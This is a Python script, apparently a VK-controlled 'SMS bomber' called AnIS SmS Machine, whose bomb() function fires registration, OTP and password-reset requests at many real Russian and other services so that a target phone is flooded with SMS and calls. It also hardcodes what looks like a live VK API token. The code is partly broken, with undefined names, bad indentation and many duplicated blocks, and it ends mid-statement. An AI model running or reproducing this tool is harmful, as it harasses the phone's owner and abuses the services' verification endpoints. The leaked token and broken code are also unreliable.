# Разработчик: anisifor1305

# Имортирование
import requests, random, datetime, sys, time, argparse, os
import vk_api
import random
from vk_api.longpoll import VkLongPoll, VkEventType
import subprocess
import time
import re
from colorama import Fore, Back, Style

# API-ключ ВК
token = "33aa18ca9284705991353742309ac00c8b0b39e4b6c9af325cd437fa6ae477d0b75faef998c3280befa39"

# Авторизуемся как сообщество
vk = vk_api.VkApi(token=token, login='0', password='0')

lon = VkLongPoll(vk)

print("Бот [В]Контакте функционирует")

# Баннер бомбера в консоли
banner = """
 ____________________________________________________
|                                                    |
| [--] AnIS SmS Machine by AnISTech                  |
|                                                    |
| [--] Запросов за 1 попытку: 49                     |
|                                                    |
| [--] Версия: 1.0                                   |
|____________________________________________________|
"""

print(banner)
_phone = "0"

_name = ''
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
_phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
_phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
_phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[9:11]
_phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]

iteration = 0

# Функция написания сообщения
def write_msg(rand_int, user_id, message):
    vk.method('messages.send', {'user_id': user_id, 'message': message, 'random_id': rand_int})

# Функция бомбинга
def bomb():
    global idi
    global _name
    global _phone
    global _phone9
    global _phone9dostavista
    global _phoneAresBank
    global _phoneOstin
    global _phonePizzahut
    global _phoneGorzdrav
    global password
    global username
    global iteration

    _email = _name + f'{iteration}' + '@gmail.com'
    email = _name + f'{iteration}' + '@gmail.com'
    try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                      data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                            'deviceToken': '*'}, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        print('[+] Grab отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
        print('[+] RuTaxi отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
        print('[+] BelkaCar отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                      data={'phone_number': _phone}, headers={})
        print('[+] Tinder отправлено!')
    except:
        print('[-] Не отправлено!')

    # try:
    #	requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
    #	print('[+] Karusel отправлено!')
    # except:
    #	print('[-] Не отправлено!')

    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
        print('[+] Tinkoff отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
        print('[+] MTS отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        print('[+] Youla отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://pizzahut.ru/account/password-reset',
                      data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut, '_token': '*'})
        print('[+] PizzaHut отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
        print('[+] Rabota отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
        print('[+] Rutube отправлено!')
    except:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        print('[+] Citilink отправлено!')

    try:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                      data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
        print('[+] Smsint отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.get(
            'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
        print('[+] oyorooms отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                      params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                              'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                      data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
        print('[+] MVideo отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
            'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                          'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        print('[+] newnext отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
        print('[+] Sunlight отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                      json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                            'deliveryOption': 'sms'})
        print('[+] alpari отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
        print('[+] Invitro отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://online.sbis.ru/reg/service/',
                      json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                            'params': {'phone': _phone}, 'id': '1'})
        print('[+] Sberbank отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                      json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1',
                            'birthDate': '10.10.2000', 'mobilePhone': _phone9, 'russianFederationResident': 'true',
                            'isDSA': 'false', 'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null',
                            'promotionAgreement': 'true'})
        print('[+] Psbank отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
        print('[+] Beltelcom отправлено!')
    except:
        print('[-] Не отправлено!')

    # try:
    #	requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
    #	print('[+] Karusel отправлено!')
    # except:
    #	print('[-] Не отправлено!')

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
        print('[+] KFC отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                                         "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        print('[+] carsmile отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        print('[+] Citilink отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api.delitime.ru/api/v2/signup",
                      data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
        print('[+] Delitime отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
        print('[+] findclone звонок отправлен!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": _phone}})
        print('[+] Guru отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                      data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                            "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        print('[+] ICQ отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                      data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                            "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
        print('[+] InDriver отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                      data={"password": password, "application": "lkp", "login": "+" + _phone})
        print('[+] Invitro отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
        print('[+] Pmsm отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
        print('[+] IVI отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
                      json={'phone': '+' + self.formatted_phone})
        print('[+] Lenta отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                      json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
        print('[+] Mail.ru отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                      params={"pageName": "registerPrivateUserPhoneVerificatio"},
                      data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
        print('[+] MVideo отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                      data={"st.r.phone": "+" + _phone})
        print('[+] OK отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://plink.tech/register/', json={"phone": _phone})
        print('[+] Plink отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
        print('[+] qlean отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
        print('[+] SMSgorod отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                      data={'phone_number': _phone})
        print('[+] Tinder отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',
                      json={"birthday": {"day": 11, "month": 11, "year": 1999},
                            "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                            "password": password, "phone_number": _phone, "username": username})
        print('[+] Twitch отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                      headers={'App-ID': 'cabinet'})
        print('[+] CabWiFi отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
        print('[+] wowworks отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone})
        print('[+] Eda.Yandex отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        print('[+] Youla отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                      json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                            "deliveryOption": "sms"})
        print('[+] Alpari отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
        print('[+] SMS отправлено!')
    except:
        print('[-] не отправлено!')
     try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
        print('[+] Tinkoff отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
        print('[+] MTS отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        print('[+] Youla отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://pizzahut.ru/account/password-reset',
                      data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut, '_token': '*'})
        print('[+] PizzaHut отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
        print('[+] Rabota отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
        print('[+] Rutube отправлено!')
    except:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        print('[+] Citilink отправлено!')

    try:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                      data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
        print('[+] Smsint отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.get(
            'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
        print('[+] oyorooms отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                      params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                              'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                      data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
        print('[+] MVideo отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
            'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                          'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        print('[+] newnext отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
        print('[+] Sunlight отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                      json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                            'deliveryOption': 'sms'})
        print('[+] alpari отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
        print('[+] Invitro отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://online.sbis.ru/reg/service/',
                      json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                            'params': {'phone': _phone}, 'id': '1'})
        print('[+] Sberbank отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                      json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1',
                            'birthDate': '10.10.2000', 'mobilePhone': _phone9, 'russianFederationResident': 'true',
                            'isDSA': 'false', 'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null',
                            'promotionAgreement': 'true'})
        print('[+] Psbank отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
        print('[+] Beltelcom отправлено!')
    except:
        print('[-] Не отправлено!')

    # try:
    #	requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
    #	print('[+] Karusel отправлено!')
    # except:
    #	print('[-] Не отправлено!')

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
        print('[+] KFC отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                                         "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        print('[+] carsmile отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        print('[+] Citilink отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api.delitime.ru/api/v2/signup",
                      data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
        print('[+] Delitime отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
        print('[+] findclone звонок отправлен!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": _phone}})
        print('[+] Guru отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                      data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                            "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        print('[+] ICQ отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                      data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                            "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
        print('[+] InDriver отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                      data={"password": password, "application": "lkp", "login": "+" + _phone})
        print('[+] Invitro отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
        print('[+] Pmsm отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
        print('[+] IVI отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',
                      json={"birthday": {"day": 11, "month": 11, "year": 1999},
                            "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                            "password": password, "phone_number": _phone, "username": username})
        print('[+] Twitch отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
                      json={'phone': '+' + self.formatted_phone})
        print('[+] Lenta отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                      data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                            "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        print('[+] ICQ отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                      json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
        print('[+] Mail.ru отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                      params={"pageName": "registerPrivateUserPhoneVerificatio"},
                      data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
        print('[+] MVideo отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                      data={"st.r.phone": "+" + _phone})
        print('[+] OK отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',
                      json={"birthday": {"day": 11, "month": 11, "year": 1999},
                            "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                            "password": password, "phone_number": _phone, "username": username})
        print('[+] Twitch отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://plink.tech/register/', json={"phone": _phone})
        print('[+] Plink отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
        print('[+] qlean отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
        print('[+] SMSgorod отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                      data={'phone_number': _phone})
        print('[+] Tinder отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',
                      json={"birthday": {"day": 11, "month": 11, "year": 1999},
                            "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                            "password": password, "phone_number": _phone, "username": username})
        print('[+] Twitch отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                      headers={'App-ID': 'cabinet'})
        print('[+] CabWiFi отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
        print('[+] wowworks отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone})
        print('[+] Eda.Yandex отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        print('[+] Youla отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        print('[+] Youla отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone})
        print('[+] Eda.Yandex отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                      json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                            "deliveryOption": "sms"})
        print('[+] Alpari отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
        print('[+] SMS отправлено!')
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
        print('[+] Delivery отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                      data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                            "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
        print('[+] Отправлено!')
    except:
        print("Отправлено")
    try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                      data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                            'deviceToken': '*'}, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        print('[+] Grab отправлено!|| Кол-во - ' + str(R))
    except:
        print('[-] Не отправлено!')
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                      data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                            'deviceToken': '*'}, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
    try:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]

        print('[+] RuTaxi отправлено!')

    except:
        print('[-] Не отправлено !')

    try:
        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})

        print('[+] BelkaCar отправлено!')

    except:
        print('[-] Не отправленo !')

    try:
        requests.post('https://starpizzacafe.com/mods/a.function.php',
                      data={'aj': '50', 'registration-phone': _phone})

        print('[+] StarPizzaCafe отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                      data={'phone_number': _phone}, headers={})

        print('[+] Tinder отправлено!')

    except:
        print('[-] error in sent!')

    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})

        print('[+] Karusel отправлено!')

    except:
        print('[-] error in sent!')

    try:

        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})

        print('[+] Tinkoff отправлено!')

    except:
        print('[-] error in sent!')
    try:

        requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})

        print('[+] Dostavista отправлено!')

    except:
        print('[-] не отправлено!')

    try:

        requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})

        print('[+] MonoBank отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://widgets.binotel.com/getcall/call/', {"status": "success", "GetCallID": 13302425})

        print('[+] binotel отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
                     data={"phone": _phone})

        print('[+] SportMaster отправлено!')

    except:
        print('[-] не отправлено!')

    try:

        requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})

        print('[+] Alfalife отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})

        print('[+] KoronaPay отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone, })

        print('[+] BTfair отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://ggbet.ru/api/auth/register-with-phone',
                      data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on",
                            "oferta": "on", })

        print('[+] GGbet отправлено!')

    except:
        print('[-]  не отправлено!')
    try:
        requests.post('https://www.etm.ru/cat/runprog.html',
                      data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services",
                            "getSysParam": "yes", })
        print('[+] ETM отправлено!')

    except:
        print('[-] не отправлено!')
    try:

        requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, })

        print('[+] TheLive отправлено!')

    except:
        print('[-] не отправлено!')
    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})

        print('[+] MTS отправлено!')

    except:
        print('[-] error in sent!')

    try:
        requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})

        print('[+] MyGames отправлено!')

    except:
        print('[+] error in sent!')
    try:
        requests.post('https://zoloto585.ru/api/bcard/reg/',
                      json={"name": _name, "surname": _name, "patronymic": _name, "sex": "m",
                            "birthdate": "11.11.1999", "phone": (_phone, "+* (***) ***-**-**"), "email": _email,
                            "city": "Москва", })
        print('[+] Zoloto585 отправлено!')

    except:
        print('[-] не отправлено!')
    try:
        requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})

        print('[+] Kasta отправлено!')

    except:
        print('[-] Kasta Не отправлено!')

    try:
        requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
                      data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
        print('[+] Тaxi отправлено!')
    except:
        print('[-] не отправлено!')
    try:

        requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                      json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
        print('[+] Mail.ru отправлено!')
    except:
        print('[-] не отправлено!')
    try:
        requests.post('https://api.creditter.ru/confirm/sms/send',
                      json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })
        print('[+] Creditter отправлено!')
    except:
        print('[-] не отправлено!')
    try:
        requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
                      headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},
                      json={"Birthday": "1986-07-10T07:19:56.276+02:00",
                            "DocIssueDate": "2004-02-05T07:19:56.276+02:00", "DocNumber": randint(500000, 999999),
